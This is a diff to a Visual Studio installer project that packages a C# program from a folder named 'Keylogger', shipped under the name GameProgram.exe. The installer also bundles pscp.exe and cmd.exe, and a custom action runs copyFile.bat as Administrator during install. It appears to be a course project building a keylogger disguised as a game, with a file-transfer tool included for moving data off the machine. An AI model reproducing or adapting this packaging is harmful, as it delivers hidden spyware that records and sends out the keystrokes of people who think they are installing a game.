@@ -15,32 +15,32 @@
     {
         "Entry"
         {
-        "MsmKey" = "8:_2E9A3171432842859813E35C355CE97C"
+        "MsmKey" = "8:_60234722AB7A4E04BC596082F2FD57E8"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
         "Entry"
         {
-        "MsmKey" = "8:_427D4532887A4C8782B1CFDC8C2B95C0"
+        "MsmKey" = "8:_7A5CD745C3C848D19C09FA8E13AE0435"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
         "Entry"
         {
-        "MsmKey" = "8:_AD154E1B21FA477F9705DD3A5D6A9373"
+        "MsmKey" = "8:_8FF07C158CAD4E0694B3F3E38576CF88"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
         "Entry"
         {
-        "MsmKey" = "8:_EE58EC7A0FF74D0E8535CD10584C17E4"
+        "MsmKey" = "8:_E699DBC3867F44488CA4ECA4819B18C2"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
         "Entry"
         {
         "MsmKey" = "8:_UNDEFINED"
-        "OwnerKey" = "8:_2E9A3171432842859813E35C355CE97C"
+        "OwnerKey" = "8:_8FF07C158CAD4E0694B3F3E38576CF88"
         "MsmSig" = "8:_UNDEFINED"
         }
     }
@@ -100,6 +100,14 @@
             "PrerequisitesLocation" = "2:1"
             "Url" = "8:"
             "ComponentsUrl" = "8:"
+                "Items"
+                {
+                    "{EDC2488A-8267-493A-A98E-7D9C3B36CDF3}:.NETFramework,Version=v4.5"
+                    {
+                    "Name" = "8:Microsoft .NET Framework 4.5 (x86 and x64)"
+                    "ProductCode" = "8:.NETFramework,Version=v4.5"
+                    }
+                }
             }
         }
     }
@@ -107,17 +115,17 @@
     {
         "CustomAction"
         {
-            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_CD311D5D6E214AB895D32C99A80B40BF"
+            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_821D4A221C504990A852F23355D3A6F2"
             {
             "Name" = "8:cmd.exe"
             "Condition" = "8:"
-            "Object" = "8:_427D4532887A4C8782B1CFDC8C2B95C0"
+            "Object" = "8:_7A5CD745C3C848D19C09FA8E13AE0435"
             "FileType" = "3:2"
             "InstallAction" = "3:2"
             "Arguments" = "8:runas /user:Administrator /c \"[TARGETDIR]copyFile.bat\""
             "EntryPoint" = "8:"
             "Sequence" = "3:1"
-            "Identifier" = "8:_3326D46C_C5AC_467E_97D3_5D2F5F52FC5B"
+            "Identifier" = "8:_02AB7CF1_EFC7_4ED4_B325_DAA620FF3125"
             "InstallerClass" = "11:FALSE"
             "CustomActionData" = "8:"
             }
@@ -144,21 +152,10 @@
         }
         "File"
         {
-            "{9F6F8455-1EF1-4B85-886A-4223BCC8E7F7}:_2E9A3171432842859813E35C355CE97C"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_60234722AB7A4E04BC596082F2FD57E8"
             {
-            "AssemblyRegister" = "3:1"
-            "AssemblyIsInGAC" = "11:FALSE"
-            "AssemblyAsmDisplayName" = "8:WindowsFormsApplication1, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL"
-                "ScatterAssemblies"
-                {
-                    "_2E9A3171432842859813E35C355CE97C"
-                    {
-                    "Name" = "8:GameProgram.exe"
-                    "Attributes" = "3:512"
-                    }
-                }
-            "SourcePath" = "8:..\\..\\Keylogger-CSET4850\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\GameProgram.exe"
-            "TargetName" = "8:"
+            "SourcePath" = "8:..\\..\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\pscp.exe"
+            "TargetName" = "8:pscp.exe"
             "Tag" = "8:"
             "Folder" = "8:_1B64F153C632496C9098AD967CE41DDB"
             "Condition" = "8:"
@@ -175,7 +172,7 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_427D4532887A4C8782B1CFDC8C2B95C0"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_7A5CD745C3C848D19C09FA8E13AE0435"
             {
             "SourcePath" = "8:C:\\Windows\\System32\\cmd.exe"
             "TargetName" = "8:cmd.exe"
@@ -195,10 +192,21 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_AD154E1B21FA477F9705DD3A5D6A9373"
+            "{9F6F8455-1EF1-4B85-886A-4223BCC8E7F7}:_8FF07C158CAD4E0694B3F3E38576CF88"
             {
-            "SourcePath" = "8:..\\..\\Keylogger-CSET4850\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\pscp.exe"
-            "TargetName" = "8:pscp.exe"
+            "AssemblyRegister" = "3:1"
+            "AssemblyIsInGAC" = "11:FALSE"
+            "AssemblyAsmDisplayName" = "8:WindowsFormsApplication1, Version=1.0.0.0, Culture=neutral, processorArchitecture=MSIL"
+                "ScatterAssemblies"
+                {
+                    "_8FF07C158CAD4E0694B3F3E38576CF88"
+                    {
+                    "Name" = "8:GameProgram.exe"
+                    "Attributes" = "3:512"
+                    }
+                }
+            "SourcePath" = "8:..\\..\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\GameProgram.exe"
+            "TargetName" = "8:"
             "Tag" = "8:"
             "Folder" = "8:_1B64F153C632496C9098AD967CE41DDB"
             "Condition" = "8:"
@@ -215,9 +223,9 @@
             "IsDependency" = "11:FALSE"
             "IsolateTo" = "8:"
             }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_EE58EC7A0FF74D0E8535CD10584C17E4"
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_E699DBC3867F44488CA4ECA4819B18C2"
             {
-            "SourcePath" = "8:..\\..\\Keylogger-CSET4850\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\copyFile.bat"
+            "SourcePath" = "8:..\\..\\Keylogger-C#\\WindowsFormsApplication1\\bin\\Release\\copyFile.bat"
             "TargetName" = "8:copyFile.bat"
             "Tag" = "8:"
             "Folder" = "8:_1B64F153C632496C9098AD967CE41DDB"
